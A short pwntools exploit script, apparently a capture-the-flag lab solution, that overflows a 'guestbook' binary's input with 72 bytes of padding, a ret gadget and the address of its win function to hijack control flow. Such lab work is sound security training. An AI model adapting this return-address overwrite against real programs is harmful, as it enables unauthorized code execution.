from pwn import *

context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab1/materiale/challenges/00-guestbook/guestbook', checksec=False)
OFFSET_TO_RIP = 72
ret_gadget = 0x40101a

p = process(elf.path)
p.recvuntil(b"name?\n")
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(elf.sym.win),
)
p.send(payload)
p.interactive()